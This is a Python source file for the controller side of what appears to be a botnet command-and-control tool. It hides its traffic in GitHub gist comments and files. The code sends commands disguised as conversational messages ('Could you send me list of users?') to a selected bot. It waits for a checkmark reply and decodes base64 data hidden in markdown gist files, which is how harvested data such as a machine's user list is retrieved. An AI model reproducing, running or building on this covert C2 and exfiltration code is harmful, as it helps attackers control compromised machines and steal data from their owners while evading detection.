import requests
import os
import commands as cmd
import utils as u
from time import sleep
from dotenv import load_dotenv


class Controller:
    def __init__(self, gist_id):
        self.current_bot = None
        self.last_tag = None
        self.gist_url = os.getenv("GITHUB_API_URL") + "gists/" + gist_id
        self.headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": "Bearer " + os.getenv("GITHUB_API_TOKEN"),
            "X-GitHub-Api-Version": "2022-11-28",
        }

    def run(self):
        while True:
            command = input("Enter a command: ")
            if command == cmd.COMMAND_HELP["name"]:
                for value in cmd.COMMANDS_CONTROLLER:
                    print(value["name"], value["description"])
            elif command == cmd.COMMAND_BOT["name"]:
                bot_name = input("Enter a bot name: ")
                if self.bot_available(bot_name):
                    self.current_bot = bot_name
                    print("Switched to the bot: '" + bot_name + "'")
                else:
                    print("No such bot: '" + bot_name + "'")
            elif command == cmd.COMMAND_USERS["name"]:
                if self.current_bot is None:
                    print("No bot selected")
                    continue
                command_id = self.send_command("Could you send me list of users?")
                self.listen_for_answer(command_id)
            elif command == cmd.COMMAND_EXIT["name"]:
                print("Exiting...")
                break
            else:
                print("Unknown command")

    def send_command(self, message):
        data = {"body": (self.current_bot + " " + message)}
        res = requests.post(self.gist_url + "/comments", json=data, headers=self.headers)
        if res.status_code != 201:
            print("Failed to send command")
            print(res.json())
            exit(1)
        self.last_tag = res.headers["ETag"]
        return str(res.json()["id"])

    def listen_for_answer(self, command_id):
        headers = self.headers
        while True:
            if self.last_tag is not None:
                headers.update({"If-None-Match": self.last_tag})
            res = requests.get(self.gist_url + "/comments/" + command_id, headers=headers)
            if res.status_code == 304 or not res.json()["body"].startswith("✅ "):
                sleep(1)
                continue
            self.last_tag = None
            break
        res = requests.get(self.gist_url, headers=self.headers)
        files = res.json()["files"]
        for key in files:
            if key == self.current_bot + os.getenv("BOT_FILE_EXTENSION"):
                print(u.decode_data_from_base64(u.decode_data_from_markdown(files[key]["content"])).decode("utf-8"))

    def bot_available(self, bot_name):
        res = requests.get(self.gist_url, headers=self.headers)
        if res.status_code == 200:
            return (bot_name + os.getenv("BOT_FILE_EXTENSION")) in res.json()["files"]
        else:
            return False


def main():
    load_dotenv()
    controller = Controller(os.getenv("GIST_ID"))
    controller.run()


if __name__ == "__main__":
    main()
